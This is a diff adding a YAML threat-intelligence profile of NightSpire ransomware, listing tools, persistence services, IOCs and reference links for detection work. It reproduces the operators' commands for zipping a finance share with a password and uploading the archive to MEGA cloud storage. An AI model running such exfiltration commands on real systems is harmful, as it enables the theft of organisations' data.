@@ -1,0 +1,58 @@
+title: NightSpire Ransomware Attack Chain, Tools and Tactics
+description: NightSpire is a Go-based ransomware family using double extortion, stealing
+  files before encryption and threatening to leak them on a Tor-based site. Operators
+  leverage legitimate remote access and file management tools for persistence, discovery,
+  and exfiltration to MEGA cloud storage.
+attribution: ''
+malware_families:
+- NightSpire
+cves: []
+ttps:
+  processes:
+  - remoting_host.exe
+  - AnyDesk.exe
+  - conhost.exe
+  - Everything.exe
+  - 7z.exe
+  - MEGAsync.exe
+  command_lines:
+  - '"C:\Program Files (x86)\Google\Chrome Remote Desktop\147.0.7727.3\remoting_host.exe"
+    --type=daemon --host-config="C:\ProgramData\Google\Chrome Remo..."'
+  - '"C:\Program Files (x86)\AnyDesk\AnyDesk.exe" --service'
+  - '"C:\Program Files (x86)\AnyDesk\AnyDesk.exe" --control'
+  - '"C:\Program Files\Everything\Everything.exe"'
+  - '"C:\Program Files\7-Zip\7z.exe" a -tzip -p<PASSWORD> -mx5 C:\Users\<USER>\Downloads\data.zip
+    "C:\Shares\Finance\*"'
+  - '"C:\Users\<USER>\AppData\Local\MEGAsync\MEGAsync.exe" /upload "C:\Users\<USER>\Downloads\data.zip"'
+  powershell: []
+  scripts: []
+  registry_keys: []
+  image_loads: []
+  network_connections: []
+  file_activity:
+  - C:\Program Files (x86)\Google\Chrome Remote Desktop\147.0.7727.3\remoting_host.exe
+  - C:\Program Files (x86)\AnyDesk\AnyDesk.exe
+  - C:\Program Files\Everything\Everything.exe
+  - C:\Program Files\7-Zip\7z.exe
+  - C:\Users\<USER>\AppData\Local\MEGAsync\MEGAsync.exe
+  - C:\Users\<USER>\Downloads\data.zip
+  - anydesk.lnk
+  persistence:
+  - Windows service named "Chrome Remote Desktop Service" running remoting_host.exe
+    with --type=daemon
+  - Windows service named "AnyDesk Service" running AnyDesk.exe with --service
+  - Shortcut anydesk.lnk placed in Startup folder for AnyDesk auto-start on boot
+  process_relations: []
+iocs:
+  hashes: []
+  ip_addresses: []
+  domains:
+  - prince1990905@gmail[.]com
+  urls:
+  - hxxps://www.broadcom[.]com/support/security-center/protection-bulletin/nightspire-ransomware
+  - hxxps://www.huntress[.]com/blog/nightspire-ransomware
+  - hxxps://www.sonicwall[.]com/blog/nightspire-ransomware-encrypts-onedrive-files
+authors: []
+reference: https://www.picussecurity.com/resource/blog/nightspire-ransomware-attack-chain-tools-and-tactics
+date_of_publication: May 26, 2026
+file_creation_date: May 26, 2026
